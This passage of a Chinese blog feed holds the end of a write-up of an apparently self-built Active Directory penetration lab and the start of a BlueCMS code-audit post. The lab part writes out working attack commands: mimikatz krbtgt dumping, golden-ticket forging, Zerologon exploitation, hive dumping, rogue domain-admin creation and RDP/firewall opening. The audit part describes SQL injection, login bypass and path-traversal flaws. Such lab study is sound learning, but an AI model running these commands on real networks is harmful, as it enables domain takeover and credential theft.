src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113654103.png" alt="image-20210803113654103"></p></li><li><p>域内用户列表：<code>net user /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803114713304.png" alt="image-20210803114713304"></p></li><li><p>获取域内用户的详细信息：<code>wmic useraccount get /all</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823124332827.png" alt="image-20210823124332827"></p></li><li><p>查看存在的用户：<code>dsquery user</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823124425459.png" alt="image-20210823124425459"></p><blockquote><p>无法允许？？？</p></blockquote></li><li><p>本地管理员组：<code>net localgroup administrators</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803115511194.png" alt="image-20210803115511194"></p></li><li><p>查询域管理员：<code>net group &quot;domain admins&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803140643801.png" alt="image-20210803140643801"></p></li></ol><h6 id="收集定位域管理"><a href="#收集定位域管理" class="headerlink" title="收集定位域管理"></a><strong>收集定位域管理</strong></h6><ol><li><p>使用<code>psloggedon</code>查询谁登录了远程计算机资源</p></li><li><p>使用<code>PVEFindADUser</code>查询查询活动目录用户登录位置，枚举域用户，查找在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户，用于运行服务和计划任务的用户（需要管理员权限）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803143758539.png" alt="image-20210803143758539"></p><blockquote><p>未查询到任何有用的东西</p></blockquote></li><li><p>使用<code>netview</code>查询（大部分功能不需要管理员权限）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803142542668.png" alt="image-20210803142542668"></p><blockquote><p>子域控上 发现了二级网络：10.10.21.5</p></blockquote></li><li><p>使用<code>powerView</code>脚本（常用）</p><p><code>powerView.ps1</code>是一款依赖powershell和wmi对内网进行查询的常用渗透测试脚本，集成在powersploit工具包中，是一个收集域信息很好用的脚本。</p></li></ol><h6 id="查找域控的用户会话"><a href="#查找域控的用户会话" class="headerlink" title="查找域控的用户会话"></a><strong>查找域控的用户会话</strong></h6><p>内网渗透中，通常围绕着收集明文凭据或者通过mimikatz提权等方法，如果内网环境非常的复杂，我们无法立即在用有权限的系统中获得域管理员进程，那么通常可以采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工具，找到渗透测试的路径。</p><ol><li><p>本机检测：<code>tasklist -v</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803144742505.png" alt="image-20210803144742505"></p></li><li><p>查询域控制器和域管理员列表：</p><p><code>net group &quot;Domain Controllers&quot; /domain</code> </p><p><code>net group &quot;Domain Admins&quot; /domain</code></p></li><li><p>收集所有活动域的会话列表</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803145339427.png" alt="image-20210803145339427"></p></li></ol><blockquote><p>收集到的信息很多并且比较杂乱，收集完成之后需要单独整理一下，建议后面写一个模板方便整理信息</p><p>内网环境存在域并且存在多级内网，并且可以大致画出内网一部分拓扑</p><p>信息收集的深度和广度决定了后期的发展，收集到的信息的整理也是十分重要的。</p></blockquote><h4 id="CS渗透"><a href="#CS渗透" class="headerlink" title="CS渗透"></a>CS渗透</h4><p>上线CS的准备工作</p><ol><li><p>建立监听</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130044870.png" alt="image-20210823130044870"></p></li><li><p>生成payload</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130240253.png" alt="image-20210823130240253"></p></li><li><p>上传exe，CS上线</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130457523.png" alt="image-20210823130457523"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130508183.png" alt="image-20210823130508183"></p></li></ol><p>利用CS提权</p><blockquote><p>推荐两个CS的插件</p><p><a href="https://github.com/z1un/Z1-AggressorScripts">https://github.com/z1un/Z1-AggressorScripts</a></p><p><a href="https://github.com/lintstar/LSTAR">https://github.com/lintstar/LSTAR</a></p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823142539507.png" alt="image-20210823142539507"></p><blockquote><p>成功获取到了web服务器的管理员权限</p></blockquote><p>下一步准备获取子域控的权限，先搭建隧道，然后利用web服务器当作跳板机攻击子域控</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823144034038.png" alt="image-20210823144034038"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823144020628.png" alt="image-20210823144020628"></p><p>检测隧道</p><p>配置<code>sudo vim /etc/proxychains.conf</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823144438818.png" alt="image-20210823144438818"></p><blockquote><p>隧道搭建成功</p></blockquote><p>利用代理打开MSF：<code>proxychains msfconsole</code> 然后确认是否有MS17-010漏洞</p><blockquote><p>也可以进去后运行</p><p>setg Proxies socks5:192.168.1.15:6000</p><p>setg ReverseAllowProxy true</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823145340538.png" alt="image-20210823145340538"></p><p>利用漏洞获取子域控权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823145610266.png" alt="image-20210823145610266"></p><p>利用命令自己创建一个域控用户，并且将用户加入域管组</p><p><code>net user lcdm lcdm123 /add /doamin</code>  添加域用户</p><p><code>net group &quot;Domain Admins&quot; lcdm /add /domain</code>  将用户加入用户组</p><p><code>net user lcdm123</code>  检查用户是否存在</p><blockquote><p><del>添加失败，原因不清楚</del>  后期发现是因为用户的密码不够复杂</p></blockquote><p>开启远程桌面端口</p><p><code>reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</code> 设置远程端口</p><p><code>wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code> 开启远程桌面</p><p><code>set command &quot;netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow&quot;</code> 防火墙放行3389</p><blockquote><p>这个是也打开失败了？？？ 也没有具体回显，不清楚原因</p></blockquote><p>先把子域控放在一边，回到CS选取另外的方法，先抓取本地用户密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823160344639.png" alt="image-20210823160344639"></p><p>开启远程桌面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823160426190.png" alt="image-20210823160426190"></p><p>登录web服务器</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823160831478.png" alt="image-20210823160831478"></p><blockquote><p>当前用户不能远程桌面</p></blockquote><p>解决办法<code> net localgroup &quot;Remote Users&quot; XIAOYU\web /add</code> </p><blockquote><p>添加时需要填写完整的用户信息，包括所在的域 </p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823161221182.png" alt="image-20210823161221182"></p><p>连接成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823161421368.png" alt="image-20210823161421368"></p><p>继续获取域控权限，检查主机是否存在MS14-068漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823165525149.png" alt="image-20210823165525149"></p><blockquote><p>失败了………… 继续想其他办法</p></blockquote><p>尝试重新回到添加用户的地方，对于用户添加失败那里，猜想会不会是密码的问题，因为刚刚也有这个问题，果然把密码变复杂之后就可以成功添加用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823172216247.png" alt="image-20210823172216247"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823172227624.png" alt="image-20210823172227624"></p><blockquote><p>这里加入管理员组好像还是没有成功</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823172248834.png" alt="image-20210823172248834"></p><p>接下来是继续尝试开启远程桌面</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">REG <span class="hljs-builtin-name">ADD</span> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br></code></pre></td></tr></table></figure><blockquote><p>本地可以执行但是远程不能执行？ 原因不明</p><p>先直接在本地开启吧，然后把添加的用户加入域管理员组，往后渗透吧:sob:</p><p>师傅的新思路：将命令写入bat文件，然后执行bat，这个平时在linux上利用较多在Windows就没有反应过来:pig:</p></blockquote><p>利用隧道在本地上连接远程桌面后报错</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823174550341.png" alt="image-20210823174550341"></p><p>直接套娃，利用web服务器的远程桌面连接域控的远程桌面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824101043489.png" alt="image-20210824101043489"></p><blockquote><p><del>到这里存在的问题</del></p><ol><li><del>远程桌面是我主动直接在子域控上开启的</del></li><li><del>添加用户成功，但是用户添加到域管理员组失败，我直接在本机上添加，然后继续往后测试</del></li></ol><p>还需要多积累点windows漏洞</p></blockquote><p>MS17-010利用失败可以选择使用下面的方法攻击</p><p><strong>CVE-2020-1472</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826140535452.png" alt="image-20210826140535452"></p><blockquote><p>存在CVE-2020-1472漏洞，可以直接利用，具体利用在攻击独立域控板块，获取到shell后可以直接添加用户开启远程桌面等</p></blockquote><p>创建域管理员用户后，将WEB服务器与子域控建立<code>ipc</code>连接</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\10.10.3.6\ipc$  <span class="hljs-string">&quot;password&quot;</span> /user:username 建立连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> 查看连接<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824102350664.png" alt="image-20210824102350664"></p><p><strong>子域上线CS</strong></p><p>先建立一个监听</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824110008260.png" alt="image-20210824110008260"></p><p><img src="D:\markdown\image-20210824110031253.png" alt="image-20210824110031253"></p><p>利用这个监听器生成一个payload，然后上传到web服务器，之后利用<code>ipc$</code>上传到子域控服务器，利用远程桌面执行payload，子域就上线了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824110423622.png" alt="image-20210824110423622"></p><h4 id="获取父域权限"><a href="#获取父域权限" class="headerlink" title="获取父域权限"></a>获取父域权限</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mimikatz.exe<br>lsadump::lsa /patch /<span class="hljs-symbol">user:</span>lcdm123<span class="hljs-variable">$ </span> <span class="hljs-comment">#lcdm123是父域名(lcdm123.com)前面的那部分</span><br>lsadump::trust /patch<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824133332369.png" alt="image-20210824133332369"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824133034799.png" alt="image-20210824133034799"></p><blockquote><p>XIAOYU       S-1-5-21-2845514817-4131120174-542881076</p><p>LCDM123    S-1-5-21-2230540616-3190751709-2169179123</p><p>NTLM     715e932ab28c6dfc6ebe0ef915f6e26a</p></blockquote><p>接着继续获取krbtgt散列值</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-attr">lsadump:</span>:lsa <span class="hljs-regexp">/patch /</span><span class="hljs-attr">user:</span>krbtgt<br><span class="hljs-attr">sekurlsa:</span>:krbtgt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824133911902.png" alt="image-20210824133911902"></p><p>伪造黄金票据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Kerberos</span>::golden /user:administrator /domain:当前域名 /sid:当前SID /sids:目标域SID-<span class="hljs-number">519</span> /krbtgt: krbtgt散列 /ptt<br><span class="hljs-attribute">Kerberos</span>::golden /user:administrator /domain:xiaoyu.lcdm<span class="hljs-number">123</span>.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2845514817</span>-<span class="hljs-number">4131120174</span>-<span class="hljs-number">542881076</span> /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2230540616</span>-<span class="hljs-number">3190751709</span>-<span class="hljs-number">2169179123</span>-<span class="hljs-number">519</span> /krbtgt:<span class="hljs-number">7</span>f<span class="hljs-number">5</span>c<span class="hljs-number">19853</span>ad<span class="hljs-number">2</span>ead<span class="hljs-number">5</span>a<span class="hljs-number">20</span>f<span class="hljs-number">32864</span>ebb<span class="hljs-number">3210</span> /ptt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824134706936.png" alt="image-20210824134706936"></p><p>尴尬好像还是拒绝访问</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824135858818.png" alt="image-20210824135858818"></p><blockquote><p>说明以上步骤是有问题的</p></blockquote><blockquote><p>有个小疑问？？ 怎么查父域的计算机名</p></blockquote><p><del>这里先暂停，继续往后面做</del></p><p><strong>CVE-2020-1742</strong></p><p>利用<code>mimikatz</code>检查漏洞是否存在</p><p><code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:mainyu$&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826140919742.png" alt="image-20210826140919742"></p><p>置零攻击<code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:CAIWUYU$ /exploit&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826141153288.png" alt="image-20210826141153288"></p><p>抓取置零后的hash</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826142300737.png" alt="image-20210826142300737"></p><p>连接上shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826142557317.png" alt="image-20210826142557317"></p><blockquote><p>此时可以任意添加用户，开启远程功能了</p></blockquote><p>下载sam文件（恢复原hash）并且添加域管理员用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143121418.png" alt="image-20210826143121418"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143208733.png" alt="image-20210826143208733"></p><p>恢复hash</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143647194.png" alt="image-20210826143647194"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143702610.png" alt="image-20210826143702610"></p><blockquote><p>恢复成功</p></blockquote><p>建立IPC$</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826144643007.png" alt="image-20210826144643007"></p><blockquote><p>这个又是什么问题？？？ 未解决！！！</p></blockquote><h4 id="攻击独立域控"><a href="#攻击独立域控" class="headerlink" title="攻击独立域控"></a>攻击独立域控</h4><p>发现主机存在其他网段，所以继续扫描内网，发现新主机</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824143350418.png" alt="image-20210824143350418"></p><p>搭建二级代理进行攻击</p><blockquote><p>ew二级代理失败……  尝试其他办法</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824151347382.png" alt="image-20210824151347382"></p><p>使用FRP搭建二级代理</p><blockquote><p>需要格外注意各内容填写，根据之前自己总结的搭建，不会出什么大问题</p></blockquote><p><strong>开始攻击独立域</strong></p><p><del>MS17-010</del> 失败</p><p>首先为MSF设置代理</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824163753996.png" alt="image-20210824163753996"></p><p>测试是否存在MS17-010</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824163910769.png" alt="image-20210824163910769"></p><p>测试执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824163948984.png" alt="image-20210824163948984"></p><blockquote><p>还存在一个内网IP……</p></blockquote><p>使用MSF尝试获取shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824170723112.png" alt="image-20210824170723112"></p><blockquote><p>失败了，尝试添加用户也遇到了之前的情况，远程桌面也不能打开，应该是命令存在问题吧</p></blockquote><p><strong>CVE-2020-1472</strong></p><p><code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:CAIWUYU$&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826095722660.png" alt="image-20210826095722660"></p><blockquote><p>测试得出漏洞是存在的</p></blockquote><p>使用mimikatz利用CVE-2020-1472将域控密码设置为空</p><p><code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:CAIWUYU$ /exploit&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826100141094.png" alt="image-20210826100141094"></p><blockquote><p>成功置空</p></blockquote><p>使用impacket工具包攻击</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">proxychains git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/SecureAuthCorp/impacket.git<br><span class="hljs-keyword">cd</span> impacket/<br>sudo pip3 install .<br>sudo <span class="hljs-keyword">python3</span> setup.<span class="hljs-keyword">py</span> install<br><br>pip3安装：<br>wget http<span class="hljs-variable">s:</span>//bootstrap.pypa.io/<span class="hljs-built_in">get</span>-pip.<span class="hljs-keyword">py</span><br><span class="hljs-keyword">python3</span> <span class="hljs-built_in">get</span>-pip.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826102318636.png" alt="image-20210826102318636"></p><p>下载sam文件为下一步恢复机器密码做准备</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826102936705.png" alt="image-20210826102936705"></p><p>问题来了，居然不能下载<code>.save</code>文件</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> HKLM\SYSTEM <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span><br>reg <span class="hljs-built_in">save</span> HKLM\SAM sam.<span class="hljs-built_in">save</span><br>reg <span class="hljs-built_in">save</span> HKLM\SECURITY security.<span class="hljs-built_in">save</span><br><br><span class="hljs-built_in">get</span> <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">get</span> sam.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">get</span> security.<span class="hljs-built_in">save</span><br><br><span class="hljs-built_in">del</span> /f <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">del</span> /f sam.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">del</span> /f security.<span class="hljs-built_in">save</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826105746880.png" alt="image-20210826105746880"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826104057033.png" alt="image-20210826104057033"></p><blockquote><p>猜测有可能是多级代理的问题吧，网络不稳导致下载失败</p><p>错误原因：impacket最新包自身问题，使用之前的版本即可</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826105721993.png" alt="image-20210826105721993"></p><p>利用 shell 添加一个域管理员用户</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>lcdm1 hongrisec@2021 /<span class="hljs-builtin-name">add</span> /domain<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain admins&quot;</span> lcdm1 /<span class="hljs-builtin-name">add</span> /domain<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826111805204.png" alt="image-20210826111805204"></p><p>利用下载到的文件获取到原 hash</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826110244043.png" alt="image-20210826110244043"></p><p>恢复原密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826111140817.png" alt="image-20210826111140817"></p><p>建立 IPC，传入上线 CS</p><p><code>net use \\10.10.21.2\ipc$ &quot;hongrisec@2021&quot; /user:lcdm1</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826112116377.png" alt="image-20210826112116377"></p><p>使用 PsExec 获取到财务域的 Shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826134343505.png" alt="image-20210826134343505"></p><p>虽然连上了但是 CS 一直不能上线</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826134903610.png" alt="image-20210826134903610"></p><blockquote><p><del>难道是多级代理的问题导致弹不出来？？？ 但是这个是使用的监听器应该和代理没有关系，应该是创建payload的手法有问题</del></p></blockquote><p>上面可以直接在CS中生成 spawn 然后利用添加的用户和密码即可上线 CS</p><p>拿到了独立域控的权限后这个域就基本全部沦陷了，这个域内还有一个主机，就可以直接控制了，大致就攻击到这里了</p><h2 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h2><blockquote><p>靶场是自己搭建的，所以在使用中存在一些问题</p></blockquote><ul><li>漏洞太单一了使用 CVE-2020-1472 就打遍了</li><li>对于对于哈希传递（PTH）攻击没有成功，应该是操作问题，需要单独复现一下</li><li>对于域森林的理解还不是太深刻（感觉就是多级代理攻击）</li><li>靶场和实际相差很多，现在使用的比较粗暴的攻击方法没有做到不留痕迹</li><li>后期的后门，痕迹清理还没有使用</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Freebuf-域渗透靶场&quot;&gt;&lt;a href=&quot;#Freebuf-域渗透靶场&quot; class=&quot;headerlink&quot; title=&quot;Freebuf 域渗透靶场&quot;&gt;&lt;/a&gt;Freebuf 域渗透靶场&lt;/h1&gt;&lt;h2 id=&quot;搭建&quot;&gt;&lt;a href=&quot;#搭建&quot; cla</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>BlueCMS</title>
    <link href="http://example.com/2021/09/01/BlueCMS/"/>
    <id>http://example.com/2021/09/01/BlueCMS/</id>
    <published>2021-09-01T02:10:10.000Z</published>
    <updated>2021-09-22T01:41:42.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BlueCMS"><a href="#BlueCMS" class="headerlink" title="BlueCMS"></a>BlueCMS</h1><blockquote><p>BlueCMS__v1.6_sp1</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个CMS是一个很老的版本，这里利用它来学习熟悉一下代码审计。审计的过程中暂时没有利用Seay工具去分析代码，而是尝试直接分析原框架，毕竟这个CMS的源码比较简单。</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="初步了解"><a href="#初步了解" class="headerlink" title="初步了解"></a>初步了解</h3><p>首先从根目录下的<code>index.php</code>文件入手，它是整个程序的入口，一开始它加载了两个php文件，之后再分析这两个文件作用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830092735808.png" alt="image-20210830092735808"></p><p>然后就是页面的各个板块信息的查询与展示，比如新闻分类列表的展示，最新分类信息等，最后利用<code>smarty</code>模板渲染展示页面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830092957266.png" alt="image-20210830092957266"></p><p><code>include/common.inc.php</code>，开始也是包含了一堆PHP文件，然后对单引号过滤，但是这个CMS使用的是GKB编码，可能会存在宽字节绕过并且这里并没有对<code>$_SERVER</code>进行过滤它也是外部可控的数据</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830093831941.png" alt="image-20210830093831941"></p><p>后面就是连接数据库操作，然后就是一些其他工作了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830094358872.png" alt="image-20210830094358872"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830094832335.png" alt="image-20210830094832335"></p><p><code>include/common.fun.php</code> 这个文件定义了很多函数提供调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830095002133.png" alt="image-20210830095002133"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830095038504.png" alt="image-20210830095038504"></p><p>还有一堆函数就不一一列出来了</p><p>后台功能查看</p><p><code>admin/index.php</code> 这个文件没有什么太多的东西，主要就是提醒用户删除安装文件，日志读取，获取配置信息等</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830101752484.png" alt="image-20210830101752484"></p><p>主要的功能逻辑部分是在<code>admin/include/common.inc.php</code>文件中处理的，它有敏感字符过滤，登录验证等功能</p><p>这里用来判断用户是否登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830102017217.png" alt="image-20210830102017217"></p><p><code>admin/login.php</code>用户登录界面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830102950559.png" alt="image-20210830102950559"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830102935926.png" alt="image-20210830102935926"></p><blockquote><p>感觉只要绕过了单引号，这个CMS就到处是SQL漏洞了</p></blockquote><p>其他的文件就是一些杂七杂八的漏洞了，可以先暂时放着</p><h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><p><code>ad_js.php</code> 这个文件中对于sql语句的过滤没有效果，因为是数字型注入</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830091607034.png" alt="image-20210830091607034"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830104231347.png" alt="image-20210830104231347"></p><p><img src="D:\markdown\image-20210830104259328.png" alt="image-20210830104259328"></p><h3 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><p>留言板和评论处都存在这个注入漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830110029339.png" alt="image-20210830110029339"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830110111423.png" alt="image-20210830110111423"></p><p>漏洞验证</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830112351558.png" alt="image-20210830112351558"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830112401719.png" alt="image-20210830112401719"></p><h3 id="SQL注入3"><a href="#SQL注入3" class="headerlink" title="SQL注入3"></a>SQL注入3</h3><blockquote><p>宽字节注入</p></blockquote><p>正常输入错误的密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830113226858.png" alt="image-20210830113226858"></p><p>成功利用宽字节注入漏洞进入系统</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830113438244.png" alt="image-20210830113438244"></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><blockquote><p>这个是在后台的漏洞，后台由于默认是管理员操作的所以权限都比较大，敏感操作很多，存在的漏洞就会很多</p></blockquote><p>后台模板管理这里可以读取和修改文件，所以我们可以尝试修改其他文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830123320939.png" alt="image-20210830123320939"></p><p>具体完成操作的PHP文件<code>admin/tpl_manage.php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830130636799.png" alt="image-20210830130636799"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830130657999.png" alt="image-20210830130657999"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830125516798.png" alt="image-20210830125516798"></p><blockquote><p>使用目录穿越可以读取任意文件内容并且修改</p></blockquote><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p><del>找到操作日志管理，这里有个删除操作，我们尝试分析代码看看是否可以造成任意文件删除</del></p><p>在<code>user.php</code>中发现了一个文件删除的操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210830140714576.png" alt="image-20210830140714576"></p><p>这个很任意实现，直接按照逻辑去掉一些参数，之后就可以执行删除操作了</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" 